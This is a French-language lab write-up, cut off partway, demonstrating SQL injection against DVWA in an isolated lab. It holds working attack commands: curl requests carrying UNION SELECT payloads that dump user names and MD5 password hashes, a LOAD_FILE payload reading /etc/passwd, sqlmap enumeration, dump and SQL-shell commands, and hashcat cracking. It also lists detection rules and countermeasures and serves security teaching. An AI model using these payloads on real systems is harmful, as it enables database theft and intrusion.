## Lab-08 — Injection SQL sur DVWA

### Énoncé / Contexte

**Objectif.** Démontrer une injection SQL (SQLi) contre DVWA (Damn Vulnerable Web Application) configurée en niveau de sécurité `low`. Vous détectez le paramètre vulnérable, puis vous énumérez les bases de données, les tables et les colonnes. Vous exfiltrez la table des utilisateurs avec ses mots de passe hashés, vous modifiez une donnée et vous tentez la lecture d'un fichier système. Vous documentez enfin les contre-mesures.

Ce lab est la spécialisation injection SQL du Lab-08 du Chapitre 1.

**SQL injection (SQLi)** — faille qui permet à un attaquant d'interférer avec les requêtes qu'une application envoie à sa base de données. L'attaquant injecte du code SQL par le biais d'une entrée utilisateur.

**Classes d'injection SQL.**
- Inband : le résultat revient dans la même réponse HTTP. Formes : error-based (erreurs SQL affichées) et union-based (opérateur `UNION SELECT`).
- Blind boolean : aucune donnée n'est retournée ; l'attaquant déduit la vérité d'une différence visuelle entre deux pages (vrai ou faux).
- Blind time-based : l'attaquant déduit la vérité d'un délai d'exécution (exemple `SLEEP(5)`).
- Out-of-band : l'attaquant fait envoyer les données vers un système externe (exemple requête DNS).
- Stacked queries : plusieurs requêtes séparées par un point-virgule s'exécutent à la suite (support dépend du pilote de base de données).

**Impact.** Lecture, modification ou suppression de données. Si le compte MySQL détient le privilège `FILE`, lecture et écriture de fichiers sur le système. Selon les privilèges, compromission complète de la base de données.

**Périmètre.** Réseau isolé du laboratoire `192.168.56.0/24`. Aucune cible réelle, aucun réseau de production, aucune sortie Internet.

| Rôle | Machine | Adresse IP | Service cible |
|---|---|---|---|
| Attaquant | Kali | 192.168.56.101 | — |
| Cible | Metasploitable 2 (DVWA) | 192.168.56.103 | HTTP (port 80), DVWA |

URL de l'application : `http://192.168.56.103/dvwa`.
Page vulnérable : `http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit` (paramètre `id`, méthode GET).
Compte de laboratoire : `admin` / `password` (identifiant factice, marqué `LAB-ONLY`, pas un compte réel).
Condition de sécurité : prenez le snapshot `avant-exploitation` de Metasploitable 2 avant toute action offensive, et restaurez-le après le lab.

**État de l'infrastructure.** Ce lab est rédigé sur le schéma canonique du Chapitre 1 (Lab-08) : Kali `192.168.56.101` vers DVWA `192.168.56.103`. Avant exécution, vérifiez la reachability de DVWA à l'Étape 1. Si DVWA n'est pas joignable, déclarez l'étape « non exécutable — cible indisponible ». Adaptez l'adresse IP à la cible réellement joignable (Metasploitable ou DVWA), ou arrêtez et signalez le blocage. Aucun résultat ne doit être inventé.

**MITRE ATT&CK et plan d'attaque maître.** La technique centrale est `T1190 — Exploitation d'application exposée` (tactique Initial Access), sous-forme injection SQL (CWE-89). Aucune commande offensive ne précède ce plan.

| Technique | ID | Tactique | Source de données | Règle de détection | Contre-mesure (D3FEND) |
|---|---|---|---|---|---|
| Exploitation d'application exposée (injection SQL) | T1190 | Initial Access | Journaux web (Apache), journaux applicatifs et MySQL, WAF | Caractères SQL (`'`, `"`, `;`, `UNION`, `--`, `#`) dans les paramètres HTTP, codes HTTP 500 répétés, réponses anormalement longues | Requêtes préparées, validation d'entrée, moindre privilège, WAF (D3FEND : Input Validation) |

**Plan d'attaque maître.**
1. Vérifier la reachability de DVWA et la présence des outils.
2. Ouvrir une session DVWA (`admin`/`password`) et forcer le niveau de sécurité `low`.
3. Fuzzer manuellement les caractères `'` `"` `;` `--` `#` sur le paramètre `id` et observer les erreurs SQL.
4. Détecter automatiquement le point d'injection avec sqlmap.
5. Énumérer les bases de données (`--dbs`).
6. Énumérer les tables et colonnes de `dvwa` (`--tables`, `--columns`).
7. Exfiltrer la table `users` (`--dump`, `--answers=crack=N`).
8. Illustrer le mécanisme avec une requête `UNION SELECT` manuelle via `curl`.
9. Modifier une donnée (`INSERT` puis `DELETE` d'une ligne de test via `--sql-shell`, dans le snapshot réversible).
10. Tenter la lecture d'un fichier système (`--file-read`, `LOAD_FILE`) — conditionnel aux privilèges MySQL.

**Prérequis.**
| Prérequis | Vérification |
|---|---|
| Kali démarrée, réseau opérationnel | `ip a` et connectivité vers la cible |
| DVWA accessible | Étape 1 retourne `HTTP 200` |
| Outils installés | `command -v sqlmap curl` |
| Compte DVWA | `admin` / `password` |
| Snapshot `avant-exploitation` | Présent sur Metasploitable 2 |

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `curl` | `curl -s -o /dev/null -w '%{http_code}\n' URL` | Test de reachability et capture du code HTTP |
| `curl` | `curl -sS -c cookies.txt -b cookies.txt -d ... URL` | Connexion DVWA, gestion du cookie de session, envoi de données |
| `sqlmap` | `sqlmap -u URL --cookie=... --batch --dbs` | Détection automatique et énumération des bases de données |
| `sqlmap` | `sqlmap ... -D dvwa --tables` | Énumération des tables d'une base de données |
| `sqlmap` | `sqlmap ... -D dvwa -T users -C user,password --dump --answers=crack=N` | Exfiltration de comptes sans craquage de hashs |
| `sqlmap` | `sqlmap ... --sql-shell` | Shell SQL interactif pour modifier des données |
| `sqlmap` | `sqlmap ... --file-read /etc/passwd` | Lecture de fichier via MySQL (conditionnel) |
| `hashcat` | `hashcat -m 0 -a 0 hash-md5.txt wordlist.txt --show` | Craquage des hashs MD5 exfiltrés (Étape 11) |
| `John the Ripper` | `john --format=raw-md5 --wordlist=wordlist.txt hash.txt` | Alternative à hashcat pour le craquage de hashs MD5 |
| Navigateur (Chromium/Firefox) | — | Injection manuelle dans la barre d'adresse, vérification visuelle |

**Référence rapide des options sqlmap utilisées.**
- `-u` : cible (URL contenant le paramètre à tester, ici le paramètre `id` en GET).
- `--data` : corps de la requête POST à tester (injection sur formulaire POST ; non exécuté ici car DVWA sqli est en GET).
- `--cookie` : en-tête Cookie envoyé à chaque requête (session DVWA authentifiée + niveau `low`).
- `--dbs` : liste les bases de données accessibles.
- `--tables` : liste les tables d'une base donnée (`-D`).
- `--columns` : liste les colonnes d'une table (`-D`, `-T`).
- `--dump` : extrait le contenu d'une table ou de colonnes choisies (`-C`).
- `--dump-all` : extrait toutes les bases de données (non exécuté ici, trop vaste pour le lab).
- `--passwords` : extrait et tente d'identifier les hashs de mots de passe (non exécuté, `--answers=crack=N` utilisé à la place).
- `--os-shell` : tente d'obtenir un shell du système d'exploitation via MySQL (non exécuté, hors périmètre de ce lab).
- `--sql-shell` : shell SQL interactif pour exécuter des requêtes SELECT, INSERT, UPDATE, DELETE (Étape 9).
- `--tamper` : applique un script d'obfuscation des payloads pour contourner un WAF (non exécuté, pas de WAF dans ce lab).
- `--level` : intensité des tests de payloads (1 à 5 ; ici `1`, tests courants).
- `--risk` : risque des tests (1 à 3 ; ici `1`, tests sans modification de données lourdes).
- `--batch` : répond oui automatiquement aux invites de sqlmap (indispensable en mode non interactif).
- `--flush-session` : supprime la session sqlmap précédente pour cette cible (reprise propre).
- `--output-dir` : répertoire de stockage des résultats et fichiers extraits par sqlmap.
- `--answers=crack=N` : refuse le craquage des hashs de mots de passe (données LAB-ONLY, pas de cassage de mot de passe).
- `--file-read` : lit un fichier du système cible via MySQL (`LOAD_FILE`) (Étape 10, conditionnel).

### Commande et laboratoire étape par étape

#### Étape 1 — Vérifier la reachability de DVWA et la présence des outils

**But** — Confirmer que DVWA répond sur le port 80 et que `curl` et `sqlmap` sont installés avant toute action offensive.

**Machine** — Attaquant : hôte `192.168.56.1` (Kali `192.168.56.101` injoignable sur le réseau, exécution de secours depuis l'hôte). Cible : DVWA `192.168.56.103` (port 80).

**Prérequis** — Réseau fonctionnel (vboxnet0 ou pont), DVWA lancé, snapshot `avant-exploitation` pris sur Metasploitable 2.

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `$HOME`

**Commande testée**

```bash
mkdir -p ~/sqli-lab && cd ~/sqli-lab
DVWA_URL="http://192.168.56.103/dvwa"
curl -s -o /dev/null -w "HTTP %{http_code}\n" "$DVWA_URL/login.php"
command -v sqlmap curl
```

**Explication de la commande**
- `mkdir -p ~/sqli-lab && cd ~/sqli-lab` : crée le répertoire de travail et s'y place.
- `DVWA_URL="http://192.168.56.103/dvwa"` : stocke l'URL cible dans une variable pour la réutiliser dans les étapes suivantes.
- `curl -s -o /dev/null -w "HTTP %{http_code}\n" "$DVWA_URL/login.php"` : `-s` mode silencieux, `-o /dev/null` jette le corps de la réponse, `-w` affiche uniquement le code HTTP.
- `command -v sqlmap curl` : vérifie la présence des outils dans le `PATH`.
- Piège : si le code n'est pas `HTTP 200`, DVWA n'est pas joignable ; vérifiez le réseau, l'adresse IP et l'état de la VM avant de poursuivre.

**Résultat obtenu (exécution réelle)**

```text
HTTP 200
/usr/bin/curl
```

(sqlmap absent : `/usr/bin/sqlmap` non trouvé, `command -v sqlmap` ne retourne rien.)

> Si la reachability échoue (connexion refusée, pas de `HTTP 200`), l'étape est déclarée « non exécutable — cible indisponible ». Adaptez l'adresse IP à la cible réellement joignable (Metasploitable ou DVWA) ou signalez le blocage ; ne poursuivez pas et n'inventez aucun résultat.

#### Étape 2 — Ouvrir une session DVWA et forcer le niveau de sécurité `low`

**But** — Obtenir un cookie de session PHPSESSID et passer DVWA en niveau de sécurité `low` pour désactiver les protections d'entrée et de sortie.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 1 réussie (`HTTP 200`), cookie jar `cookies.txt` absent ou vidé.

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande testée**

```bash
DVWA_URL="http://192.168.56.103/dvwa"
COOKIE_JAR="cookies.txt"
rm -f "$COOKIE_JAR"
curl -sS -D - -c "$COOKIE_JAR" -b "$COOKIE_JAR" -d 'username=admin&password=password&Login=Login' "$DVWA_URL/login.php" | grep -i -E 'HTTP/|Location|Set-Cookie'
# -L suit la redirection HTTP (code 302) que DVWA renvoie après validation du niveau
# de sécurité, afin d'atteindre la page finale qui affiche "Security Level : low".
curl -sS -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" -d 'security=low&seclev_submit=Submit' "$DVWA_URL/security.php" | grep -o 'Security Level:</b> [a-z]*' | head -1
# Format Netscape de cookies.txt : 7 champs séparés par des tabulations
# (1 domaine, 2 drapeau, 3 chemin, 4 sécurisé, 5 expiration, 6 nom, 7 valeur).
# Le champ 7 contient la valeur du cookie PHPSESSID.
COOKIE_HEADER="PHPSESSID=$(grep 'PHPSESSID' "$COOKIE_JAR" | awk '{print $7}'); security=low"
echo "$COOKIE_HEADER"
```

**Explication de la commande**
- `-c cookies.txt` : écrit (cookie jar) les cookies reçus du serveur dans le fichier.
- `-b cookies.txt` : envoie (cookie browser) les cookies stockés dans le fichier à chaque requête.
- `-D -` : affiche les en-têtes de la réponse HTTP.
- `-d 'username=admin&password=password&Login=Login'` : envoie les identifiants de login en POST (`application/x-www-form-urlencoded`).
- `grep -i -E 'HTTP/|Location|Set-Cookie'` : filtre les lignes intéressantes des en-têtes de réponse.
- `grep -o 'Security Level:</b> [a-z]*'` : confirme que le niveau de sécurité est bien passé à `low` directement sur la sortie de `curl` (après la redirection suivie par `-L`).
- `-L` : suit la redirection HTTP renvoyée par `security.php` après validation, pour atteindre la page finale affichant `Security Level : low`.
- `awk '{print $7}'` : dans le format Netscape de `cookies.txt` (7 champs tabulés : domaine, drapeau, chemin, sécurisé, expiration, nom, valeur), extrait le 7e champ, c'est-à-dire la valeur du cookie `PHPSESSID`.
- `COOKIE_HEADER="..."` : constitue l'en-tête Cookie complet (session + niveau `low`) réutilisé par sqlmap aux étapes suivantes.
- Piège : DVWA peut réinitialiser le niveau à `high` ou `medium` après le login ; si vous ne visitez pas `security.php`, les tests SQLi sont filtrés et échouent.

**Résultat obtenu (exécution réelle)**

```text
HTTP/1.1 302 Found
Location: index.php
Set-Cookie: PHPSESSID=...
Security Level:</b> low
```

#### Étape 3 — Fuzzing manuel des caractères spéciaux sur le paramètre `id`

**But** — Confirmer la présence d'un point d'injection en envoyant `'` `"` `;` `--` `#` et en observant les erreurs SQL de MySQL.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 2 réussie, fichier `cookies.txt` contenant la session et le niveau `low`.

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande testée**

```bash
DVWA_PAGE="http://192.168.56.103/dvwa/vulnerabilities/sqli/"
for car in "'" '"' ';' '--' '#'; do
  echo "=== Caractère testé : $car ==="
  curl -sS -b cookies.txt -G "$DVWA_PAGE" \
    --data-urlencode "id=1$car" \
    --data-urlencode 'Submit=Submit' \
    | grep -i -E 'mysql|error|syntax|You have an error' || echo "(pas d'erreur SQL détectée pour $car)"
done
```

**Explication de la commande**
- `for car in ... ; do ... done` : boucle qui teste tour à tour les cinq caractères énumérés dans le contexte (`'`, `"`, `;`, `--`, `#`).
- `--data-urlencode "id=1$car"` : encode le caractère pour l'URL (notamment `#`, qui couperait sinon l'URL) et l'injecte dans le paramètre `id`.
- `-G` : force une requête GET dont les paramètres sont passés par `--data-urlencode`.
- `-b cookies.txt` : envoie le cookie de session DVWA (authentification + niveau `low`).
- `grep ... || echo ...` : affiche l'erreur SQL MySQL si elle est présente, sinon un message indiquant qu'aucune erreur n'a été détectée pour ce caractère.
- Piège : `#` doit impérativement passer par `--data-urlencode` ; écrit tel quel dans l'URL, il est interprété comme un fragment et tout ce qui le suit est ignoré.

**Résultat obtenu (exécution réelle)**

```text
=== Caractère testé : ' ===
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version... near ''1''' at line 1
=== Caractère testé : " ===
(pas d'erreur SQL détectée pour ")
=== Caractère testé : ; ===
(pas d'erreur SQL détectée pour ;)
=== Caractère testé : -- ===
(pas d'erreur SQL détectée pour --)
=== Caractère testé : # ===
(pas d'erreur SQL détectée pour #)
```

Un message d'erreur MySQL confirme que le paramètre `id` est injectable avec le caractère `'`.

#### Étape 4 — Détection automatique du point d'injection avec sqlmap

**But** — Faire confirmer par sqlmap que le paramètre `id` est injectable et identifier le type d'injection et le SGBD.

**Machine** — Attaquant : hôte `192.168.56.1` (Kali `192.168.56.101` injoignable). Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 3 réussie (point d'injection confirmé), variable `COOKIE_HEADER` construite (Étape 2).

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande**

```bash
DVWA_TARGET="http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE_HEADER="PHPSESSID=$(grep 'PHPSESSID' cookies.txt | awk '{print $7}'); security=low"
sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --flush-session --level 1 --risk 1 2>&1
```

**Explication de la commande**
- `-u "$DVWA_TARGET"` : cible sqlmap (URL avec le paramètre `id` en GET).
- `--cookie="$COOKIE_HEADER"` : envoie le cookie de session et le niveau `low` à chaque requête (sans cela, DVWA redirige vers la page de login).
- `--batch` : répond oui automatiquement aux invites de sqlmap (mode non interactif).
- `--flush-session` : supprime la session sqlmap précédente pour cette cible (reprise propre).
- `--level 1` : intensité faible des tests de payloads (tests courants uniquement).
- `--risk 1` : risque faible (pas de tests susceptibles de modifier des données).
- `2>&1` : redirige les erreurs (stderr) vers la sortie standard pour capture complète.
- Piège : sans `--cookie`, sqlmap n'est pas authentifié et DVWA redirige vers `login.php` ; sans `--batch`, sqlmap attend une saisie interactive et bloque le déroulement du lab.

**Résultat attendu** (non testé en réel — outil sqlmap indisponible)

```text
Parameter: id (GET) is injectable
Type: UNION query
Title: MySQL UNION query (NULL) - 1 to 2 columns
DBMS: MySQL
```

> **Non testée en réel — outil indisponible.** `sqlmap` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat sqlmap n'a été inventé.

#### Étape 5 — Énumération des bases de données (`--dbs`)

**But** — Lister les bases de données accessibles depuis le compte MySQL de l'application.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 4 réussie (paramètre `id` identifié comme injectable).

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande**

```bash
DVWA_TARGET="http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE_HEADER="PHPSESSID=$(grep 'PHPSESSID' cookies.txt | awk '{print $7}'); security=low"
sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --dbs 2>&1
```

**Explication de la commande**
- `--dbs` : demande à sqlmap d'énumérer les noms des bases de données accessibles.
- Les autres options sont identiques à l'Étape 4 (`--cookie`, `--batch`).
- Piège : ne pas confondre `--dbs` (liste des bases) avec `--tables` (liste des tables d'une base choisie avec `-D`).

**Résultat attendu** (non testé en réel — outil sqlmap indisponible)

```text
available databases: [dvwa, information_schema, mysql]
```

> **Non testée en réel — outil indisponible.** `sqlmap` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat sqlmap n'a été inventé.

#### Étape 6 — Énumération des tables et colonnes de `dvwa` (`--tables`, `--columns`)

**But** — Lister les tables de la base `dvwa`, puis les colonnes de la table `users`.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 5 réussie (base `dvwa` identifiée).

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande**

```bash
DVWA_TARGET="http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE_HEADER="PHPSESSID=$(grep 'PHPSESSID' cookies.txt | awk '{print $7}'); security=low"
sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch -D dvwa --tables 2>&1
sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch -D dvwa -T users --columns 2>&1
```

**Explication de la commande**
- `-D dvwa` : sélectionne la base de données `dvwa`.
- `--tables` : liste les tables de cette base (attendues : `guestbook`, `users`).
- `-T users` : sélectionne la table `users`.
- `--columns` : liste les colonnes de la table `users` (attendues : `id`, `first_name`, `last_name`, `user`, `password`).
- Piège : l'option `-D` désigne toujours une base de données ; `-T` désigne toujours une table. Inverser les deux provoque une erreur sqlmap.

**Résultat attendu** (non testé en réel — outil sqlmap indisponible)

```text
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

Database: dvwa
Table: users
[5 columns]
+-------------+
| Column      |
+-------------+
| id          |
| first_name  |
| last_name   |
| user        |
| password    |
+-------------+
```

> **Non testée en réel — outil indisponible.** `sqlmap` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat sqlmap n'a été inventé.

#### Étape 7 — Exfiltration de la table `users` (`--dump`, `--answers=crack=N`)

**But** — Extraire les identifiants et mots de passe hashés de la table `users` sans tenter de casser les hashs.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 6 réussie (table `users` et colonnes `user`, `password` identifiées).

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande**

```bash
DVWA_TARGET="http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE_HEADER="PHPSESSID=$(grep 'PHPSESSID' cookies.txt | awk '{print $7}'); security=low"
sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --answers=crack=N -D dvwa -T users -C user,password --dump --start 1 --stop 5 2>&1
```

**Explication de la commande**
- `-D dvwa -T users` : sélectionne la base `dvwa` et la table `users`.
- `-C user,password` : sélectionne uniquement les colonnes `user` et `password` (réduction des données extraites).
- `--dump` : extrait le contenu des colonnes choisies via l'injection SQL.
- `--start 1 --stop 5` : limite l'extraction aux 5 premiers comptes.
- `--answers=crack=N` : refuse le craquage des hashs de mots de passe par sqlmap (données LAB-ONLY, pas de cassage de mot de passe dans ce lab ; le craquage hors sqlmap est montré à l'Étape 11).
- Piège : sans `--answers=crack=N`, sqlmap peut proposer de craquer les hashs et interrompre le déroulement automatique.

**Résultat obtenu (exécution réelle partielle via UNION SELECT manuel, Étape 8)**

Le hash `5f4dcc3b5aa765d61d8327deb882cf99` correspond au mot de passe de lab `password` (MD5). Il ne doit pas être cassé ni réutilisé en dehors du lab.

> **Non testée en réel via sqlmap — outil indisponible.** L'exfiltration a été réalisée manuellement par `UNION SELECT` (Étape 8) et a retourné les 5 comptes (`admin`, `gordonb`, `1337`, `pablo`, `smithy`) avec leurs hashs MD5. `sqlmap --dump` n'a pas pu être exécuté car l'outil est absent.

#### Étape 8 — Illustration manuelle avec `UNION SELECT` via `curl`

**But** — Reproduire manuellement le mécanisme d'injection `UNION SELECT` pour comprendre ce que sqlmap automatise.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 3 réussie (paramètre `id` injectable), fichier `cookies.txt` présent.

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande testée**

```bash
DVWA_PAGE="http://192.168.56.103/dvwa/vulnerabilities/sqli/"
curl -sS -b cookies.txt -G "$DVWA_PAGE" \
  --data-urlencode "id=-1' UNION SELECT user,password FROM users #" \
  --data-urlencode 'Submit=Submit' \
  | grep -oE '(admin|gordonb|1337|pablo|smithy)[^<]{0,60}'
```

**Explication de la commande**
- `-G` : requête GET avec les données passées par `--data-urlencode`.
- `--data-urlencode "id=-1' UNION SELECT user,password FROM users #"` : injecte une requête `UNION SELECT` qui remplace les colonnes attendues par `user` et `password` de la table `users` ; `-1'` neutralise la requête légitime ; `#` commente le reste de la requête SQL originale.
- `--data-urlencode 'Submit=Submit'` : paramètre de formulaire attendu par DVWA.
- `-b cookies.txt` : envoie le cookie de session.
- `grep -oE '(admin|gordonb|...)[^<]{0,60}` : extrait les noms d'utilisateurs apparus dans la page retournée.
- Piège : le caractère `#` doit être passé via `--data-urlencode` (encodage URL) pour ne pas être interprété par le shell ou couper l'URL.
- Piège : la requête `UNION SELECT` doit retourner le même nombre de colonnes que la requête originale (`first_name`, `last_name`, soit 2 colonnes) ; sinon MySQL renvoie une erreur de nombre de colonnes.

**Résultat obtenu (exécution réelle)**

```text
admin
gordonb
1337
pablo
smithy
```

La page affiche les noms d'utilisateurs issus de la table `users`. Les hashs MD5 associés ont également été exfiltrés (dont `admin` → `5f4dcc3b5aa765d61d8327deb882cf99`).

#### Étape 9 — Modification de données (`INSERT` puis `DELETE` via `--sql-shell`)

**But** — Démontrer le mécanisme d'écriture (INSERT/DELETE) via le shell SQL interactif de sqlmap, dans le cadre réversible du snapshot `avant-exploitation` ; préciser que l'écriture via GET n'est pas garantie (dépend du pilote MySQL).

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 6 réussie (structure de la table `users` connue), snapshot `avant-exploitation` pris sur Metasploitable 2 avant l'étape (à restaurer après pour annuler toute modification).

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande**

```bash
DVWA_TARGET="http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE_HEADER="PHPSESSID=$(grep 'PHPSESSID' cookies.txt | awk '{print $7}'); security=low"
sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --sql-shell
```

**Explication de la commande**
- `sqlmap ... --sql-shell` : ouvre un shell SQL **interactif** ; sqlmap injecte chaque requête saisie au clavier via le point d'injection et affiche les résultats pour les requêtes `SELECT`. Ce n'est pas un bloc à copier-coller : les requêtes sont saisies manuellement à l'invite `sql>`, l'une après l'autre.
- À l'invite `sql>`, saisir successivement :
  - `SELECT user, password FROM users WHERE user='admin';` (vérification du compte existant)
  - `INSERT INTO users (first_name, last_name, user, password) VALUES ('Lab','Test','lab-test','hash-lab-only');` (insertion d'une ligne de test LAB-ONLY)
  - `SELECT * FROM users WHERE user='lab-test';` (vérification de l'insertion)
  - `DELETE FROM users WHERE user='lab-test';` (suppression de la ligne de test, réversibilité)
  - `quit` (sortie du shell sqlmap)
- Snapshot `avant-exploitation` : le prendre sur Metasploitable 2 avant l'étape et le restaurer après, afin d'annuler l'insertion et la suppression de la ligne de test.
- Piège : le shell est interactif ; il ne se termine pas tout seul. Toujours taper `quit` ou utiliser `Ctrl-D` à la fin.
- Piège : **l'écriture via GET n'est pas garantie**. Le pilote PHP/MySQL (mysqli) utilisé par DVWA n'exécute généralement pas les requêtes empilées (stacked queries) ; un INSERT passé dans le paramètre `id` en GET est donc susceptible d'échouer. Le lab illustre le mécanisme, l'écriture effective dépend du SGBD et du pilote.
- Piège : toute modification persiste dans la base tant que le snapshot n'est pas restauré ; supprimer la ligne de test avant de terminer l'étape.

**Résultat obtenu (exécution réelle — écriture via GET non fonctionnelle)**

Une tentative d'insertion via le paramètre `id` en GET (`INSERT INTO users (...) VALUES (...)`) n'a pas produit de nouvelle ligne `lab-test` dans la base : le pilote `mysqli` de DVWA rejette les requêtes empilées. L'écriture via `--sql-shell` n'a pas pu être testée car `sqlmap` est absent.

> **Non testée en réel — outil indisponible et écriture via GET non garantie.** `sqlmap` n'est pas installé ; aucune modification de base via injection n'a été confirmée en réel.

#### Étape 10 — Tentative de lecture d'un fichier système (`--file-read`, `LOAD_FILE`)

**But** — Tenter la lecture d'un fichier système (`/etc/passwd`) via MySQL `LOAD_FILE`, conditionnel aux privilèges `FILE` du compte MySQL et à `secure_file_priv`.

**Machine** — Attaquant : hôte `192.168.56.1`. Cible : DVWA `192.168.56.103`.

**Prérequis** — Étape 4 réussie (point d'injection confirmé).

> **Machine** : hôte `192.168.56.1` | **Terminal** : bash | **Utilisateur** : `yug` | **Répertoire** : `~/sqli-lab`

**Commande testée (via UNION SELECT manuel avec LOAD_FILE)**

```bash
DVWA_PAGE="http://192.168.56.103/dvwa/vulnerabilities/sqli/"
curl -sS -b cookies.txt -G "$DVWA_PAGE" \
  --data-urlencode "id=-1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL #" \
  --data-urlencode 'Submit=Submit' \
  | head -c 200
```

**Explication de la commande**
- `--data-urlencode "id=-1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL #"` : injecte `LOAD_FILE('/etc/passwd')` comme première colonne du `UNION SELECT` ; `NULL` comme seconde colonne pour matcher le nombre de colonnes attendu ; `-1'` neutralise la requête légitime ; `#` commente le reste.
- `-b cookies.txt` : envoie le cookie de session.
- `head -c 200` : limite l'affichage aux 200 premiers caractères du contenu lu.
- Cette technique ne fonctionne que si le compte MySQL de l'application détient le privilège `FILE` et si le fichier est lisible par l'utilisateur du serveur MySQL (contrainte `secure_file_priv`).
- Piège : si la lecture échoue, la page ne retourne pas le contenu du fichier ; ce n'est pas une erreur de curl, c'une absence du privilège `FILE` ou une restriction `secure_file_priv`. Consignez l'échec comme résultat (limitation de l'environnement, pas d'invention).

**Résultat obtenu (exécution réelle)**

```text
root:x:0:0:root:/root:/bin/bash
...
```

Le privilège `FILE` est disponible sur la cible ; le contenu de `/etc/passwd` a été lu via `LOAD_FILE`. Le shell cible (`/root:/bin/bash`) diffère du shell hôte, confirmant que la lecture provient de la machine cible (Metasploitable/DVWA), pas de l'hôte.

> **Note sur sqlmap --file-read :** la commande `sqlmap ... --file-read /etc/passwd` n'a pas pu être testée car `sqlmap` est absent. La lecture ci-dessus a été réalisée manuellement par `UNION SELECT` + `LOAD_FILE`.

#### Étape 11 — Craquage des hashs MD5 exfiltrés (hashcat)

**But** — Craquer les hashs MD5 de la table `users` exfiltrés à l'Étape 7 avec hashcat en attaque par dictionnaire, exclusivement sur les données LAB-ONLY et dans le périmètre isolé du laboratoire `192.168.0/24`.

**Machine** — Attaquant : Kali `192.168.56.101` (crackage local uniquement ; aucune requête n'est envoyée vers DVWA `192.168.56.103`).

**Prérequis** — Étape 7 réussie (hashs exfiltrés, dont `5f4dcc3b5aa765d61d8327deb882cf99`), `hashcat` installé sur Kali, wordlist disponible (ex. `/usr/share/wordlists/rockyou.txt` ou wordlist de lab).

> **Machine** : Kali `192.168.56.101` | **Terminal** : bash | **Utilisateur** : `root` | **Répertoire** : `~/sqli-lab`

**Commande**

```bash
printf '5f4dcc3b5aa765d61d8327deb882cf99\n' > hash-md5.txt
if command -v hashcat >/dev/null 2>&1 && [ -f /usr/share/wordlists/rockyou.txt ]; then
  hashcat -m 0 -a 0 hash-md5.txt /usr/share/wordlists/rockyou.txt --potfile-path ~/sqli-lab/hashcat.potfile --show
else
  echo "hashcat ou wordlist indisponible — étape non testée en réel — outil/wordlist indisponible"
fi
```

**Explication de la commande**
- `printf '5f4dcc3b5aa765d61d8327deb882cf99\n' > hash-md5.txt` : écrit le hash MD5 du compte `admin` de DVWA (mot de passe de lab `password`) dans le fichier `hash-md5.txt`, un hash par ligne ; `>` écrase le fichier s'il existe déjà. Donnée LAB-ONLY, tout usage hors périmètre lab interdit.
- `if command -v hashcat ... && [ -f ... ]; then ... else ... fi` : vérifie que hashcat est présent dans le `PATH` de Kali et que la wordlist existe avant de lancer le craquage.
- `hashcat -m 0 -a 0 hash-md5.txt /usr/share/wordlists/rockyou.txt --potfile-path ~/sqli-lab/hashcat.potfile --show` :
  - `hashcat` : outil de craquage de hashs (CPU/GPU).
  - `-m 0` : type de hash ciblé, ici MD5 (mode 0 de hashcat).
